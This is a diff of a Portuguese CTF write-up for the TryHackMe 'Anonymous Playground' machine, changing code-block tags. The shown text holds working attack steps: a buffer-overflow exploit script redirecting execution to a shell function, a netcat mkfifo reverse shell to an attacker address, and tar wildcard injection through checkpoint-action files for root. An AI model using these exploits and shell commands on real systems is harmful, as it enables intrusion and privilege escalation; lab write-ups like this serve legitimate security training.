@@ -24,7 +24,7 @@ alt: "THM Anonymous Playground Writeup"
 
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Desktop/h41stur.github.io/_posts]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.196.173 --min-rate=512
 PORT   STATE SERVICE VERSION
@@ -99,7 +99,7 @@ Se este raciocínio estiver correto, a chave são pares de letras.
 
 Seguindo esta linha de raciocínio, criei o `decrypt.py`.
 
-```
+```python
 #!/usr/bin/python3
 
 def decrypt(msg):
@@ -134,7 +134,7 @@ E conseguimos acesso remoto!!!
 
 A primeira `flag.txt` se encontra no diretório do usuário.
 
-```
+```bash
 magna@anonymous-playground:~$ ls -la
 total 64
 drwxr-xr-x 7 magna  magna  4096 Jul 10  2020 .
@@ -171,7 +171,7 @@ Se conseguirmos explorar este binário, teremos um shell, a mensagem também diz
 
 Para obter o arquivo localmente, vou criptografá-lo em `base64`.
 
-```
+```bash
 magna@anonymous-playground:~$ cat hacktheworld | base64
 f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAcAVAAAAAAABAAAAAAAAAABAaAAAAAAAAAAAAAEAAOAAJ
 AEAAHQAcAAYAAAAEAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
@@ -326,7 +326,7 @@ AAAAAwEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=
 ```
 E na minha máquina local eu faço a decriptação.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Desktop]
 └─$ echo 'f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAcAVAAAAAAABAAAAAAAAAABAaAAAAAAAAAAAAAEAAOAAJ
 AEAAHQAcAAYAAAAEAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
@@ -483,14 +483,14 @@ AAAAAwEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=' | base64 -d > hacktheworld
 
 Ao executar o binário `hacktheworld`, percebemos que ele aceita um buffer de entrada e após recebê-lo, termina a execução.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Desktop]
 └─$ ./hacktheworld
 Who do you want to hack? AAAAA
 ```
 Vamos tentar enviar um buffer maior e checar seu comportamento.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Desktop]
 └─$ ./hacktheworld           
 Who do you want to hack? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -509,7 +509,7 @@ Uma destas funções é a `call_bash` que não está dentro da main e não é ch
 
 Para podermos explorar o binário, precisamos encontrar o offset para atingir o `RSP`, para isso, vamos criar um pattern de 100 caracteres com o `msf-pattern_create`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Desktop]
 └─$ msf-pattern_create -l 100
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
@@ -521,13 +521,13 @@ Agora precisamos rodar o programa no gdb e enviar este pattern.
 O comanro `r`, roda o programa, e quando ele solicitar o buffer, enviamos nosso pattern.
 O programa vai parar como esperado, para encontrarmos o valor dentro de `RSP`, podemos usar o comando `x\gx $rsp`.
 
-```
+```bash
 gdb-peda$ x/gx $rsp
 0x7fffffffdf68: 0x6341356341346341
 ```
 Temos como resposta o valor `0x6341356341346341`, vamos pesquisar este valor com o `msf-pattern_offset`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Desktop]
 └─$ msf-pattern_offset -l 100 -q 6341356341346341
 [*] Exact match at offset 72
@@ -544,7 +544,7 @@ O que precisamos fazer é enviar um buffer de 72 caracteres para preencher o off
 
 Observando o comando `info functions`, podemos obter o endereço da função.
 
-```
+```bash
 gdb-peda$ info functions
 All defined functions:
 
@@ -570,7 +570,7 @@ Non-debugging symbols:
 ```
 O endereço da função é `0x0000000000400657`, agora precisamos fazer um script simples em python para exploração.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Desktop]
 └─$ cat xpl.py 
 #!/usr/bin/python
@@ -584,7 +584,7 @@ print payload
 ```
 Vamos testar localmente nosso script.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Desktop]
 └─$ (python xpl.py ; cat) | ./hacktheworld
 Who do you want to hack? 
@@ -604,7 +604,7 @@ E conseguimos o shell local com o script!!
 
 Agora precisamos replicar o script na máquina alvo.
 
-```
+```bash
 magna@anonymous-playground:~$ cat xpl.py 
 #!/usr/bin/python
 
@@ -619,7 +619,7 @@ Ao executar nosso script, conseguimos um movimento lateral para o usuário `spoo
 
 <img src="/thm/thm-anonymousplayground-13.png">
 
-```
+```bash
 spooky@anonymous-playground:/home/spooky$ ls -la
 ls -la
 total 36
@@ -642,7 +642,7 @@ A segunda `flag.txt` se encontra no diretório do usuário spooky.
 
 Logo no início da enumeração local, encontrei uma `cron` que roda como root a cada minuto.
 
-```
+```bas
 spooky@anonymous-playground:/home/spooky$ cat /etc/crontab
 cat /etc/crontab
 # /etc/crontab: system-wide crontab
@@ -669,7 +669,7 @@ Para isso, vamos fazer o wildcard injection no diretório de trabalho do tar, qu
 
 Primeiro setamos um netcat para ouvir a conexão revarsa em nossa máquina.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Desktop]
 └─$ nc -vlnp 8443
 listening on [any] 8443 ...
@@ -677,17 +677,17 @@ listening on [any] 8443 ...
 
 Agora precisamos criar o script que irá fazer a conexão reversa na nossa máquina alvo.
 
-```
+```bash
 spooky@anonymous-playground:/home/spooky$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.26 8443 >/tmp/f" > shell.sh
 ```
 Agora adicionamos a ação do nosso checkpoint, que será executar nosso script.
 
-```
+```bash
 spooky@anonymous-playground:/home/spooky$ echo "" > "--checkpoint-action=exec=sh shell.sh"
 ```
 E por fim, adicionamos o checkpoint de fato.
 
-```
+```bash
 spooky@anonymous-playground:/home/spooky$ echo "" > --checkpoint=1
 ```
 
